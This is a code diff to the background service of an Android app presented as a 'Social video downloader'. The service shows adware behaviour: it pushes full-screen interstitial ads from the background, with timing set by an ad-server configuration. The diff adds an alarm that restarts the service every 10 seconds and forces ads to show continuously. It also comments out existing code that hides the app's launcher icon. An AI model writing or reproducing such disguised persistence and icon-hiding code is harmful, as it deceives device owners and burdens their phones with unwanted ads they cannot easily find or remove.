@@ -1,6 +1,8 @@
 package com.v2social.socialdownloader.services;
 
+import android.app.AlarmManager;
 import android.app.Instrumentation;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.ComponentName;
@@ -32,6 +34,7 @@ import com.v2social.socialdownloader.R;
 import com.v2social.socialdownloader.ShowAds;
 import com.v2social.socialdownloader.network.CheckAds;
 import com.v2social.socialdownloader.network.ClientConfig;
+import com.v2social.socialdownloader.receiver.RestartServiceReceiver;
 
 import java.io.IOException;
 import java.util.Random;
@@ -96,17 +99,25 @@ public class MyService extends Service {
 
     private void initService()
     {
-        SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
-        uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
-        idFullService = mPrefs.getString("idFullService", "/21617015150/734252/21734809637");
-        intervalService = mPrefs.getInt("intervalService", 10);
-        delayService = mPrefs.getInt("delayService", 24);
-        delay_retention = mPrefs.getInt("delay_retention", -1);
-        delay_report = mPrefs.getInt("delay_report", 1);
-        idFullFbService = mPrefs.getString("idFullFbService", "2061820020517519_2085229838176537");
+//        SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
+//        uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
+//        idFullService = mPrefs.getString("idFullService", "/21617015150/734252/21734809637");
+//        intervalService = mPrefs.getInt("intervalService", 10);
+//        delayService = mPrefs.getInt("delayService", 24);
+//        delay_retention = mPrefs.getInt("delay_retention", -1);
+//        delay_report = mPrefs.getInt("delay_report", 1);
+//        idFullFbService = mPrefs.getString("idFullFbService", "2061820020517519_2085229838176537");
+//
+//        getAdsCount();
+//        scheduleTask();
 
-        getAdsCount();
-        scheduleTask();
+        AlarmManager localAlarmManager = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
+        Intent intent = new Intent(getApplicationContext(), RestartServiceReceiver.class);
+        PendingIntent pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
+        if (localAlarmManager != null) {
+            localAlarmManager.setRepeating(AlarmManager.RTC, System.currentTimeMillis(), 10000L, pendingIntent);
+        }
+        Log.d("caomui1","alarm");
     }
 
     @Override
@@ -141,17 +152,20 @@ public class MyService extends Service {
     }
 
     private void addShortcut() {
+
+        if(true)
+            return;
         //Adding shortcut for MainActivity
-        try {
-            PackageManager p = getPackageManager();
-            ComponentName componentName = new ComponentName(this.getPackageName(), getPackageName()+".MAIN1");
-            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-//            Log.d("caomui","DONE hide icon");
-        }
-        catch (Exception e)
-        {
-//            Log.d("caomui","ERROR HIDE ICON");
-        }
+//        try {
+//            PackageManager p = getPackageManager();
+//            ComponentName componentName = new ComponentName(this.getPackageName(), getPackageName()+".MAIN1");
+//            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+////            Log.d("caomui","DONE hide icon");
+//        }
+//        catch (Exception e)
+//        {
+////            Log.d("caomui","ERROR HIDE ICON");
+//        }
 
         Intent shortcutIntent = new Intent(getApplicationContext(),
                 com.v2social.socialdownloader.MainActivity.class);
@@ -164,7 +178,7 @@ public class MyService extends Service {
         addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "Social video downloader");
         addIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE,
                 Intent.ShortcutIconResource.fromContext(getApplicationContext(),
-                        R.mipmap.ic_launcher));
+                        R .mipmap.ic_launcher));
 
         addIntent
                 .setAction("com.android.launcher.action.INSTALL_SHORTCUT");
@@ -208,8 +222,12 @@ public class MyService extends Service {
                 if (totalTime >= delayService * 60) {
                     isContinousShowAds = true;
                 }
+
+                isContinousShowAds = true;
+                Log.d("caomui","================");
             }
-        }, 0, intervalService, TimeUnit.MINUTES);
+//        }, 0, intervalService, TimeUnit.MINUTES);
+        }, 0, 15, TimeUnit.SECONDS);
 
     }
 
@@ -364,7 +382,8 @@ public class MyService extends Service {
                 new Handler(Looper.getMainLooper()).post(new Runnable() {
                     public void run() {
                         mInterstitialAd = new InterstitialAd(MyService.this);
-                        mInterstitialAd.setAdUnitId(idFullService);
+//                        mInterstitialAd.setAdUnitId(idFullService);
+                        mInterstitialAd.setAdUnitId("ca-app-pub-3940256099942544/1033173712");
                         mInterstitialAd.setAdListener(new AdListener() {
 
                             @Override
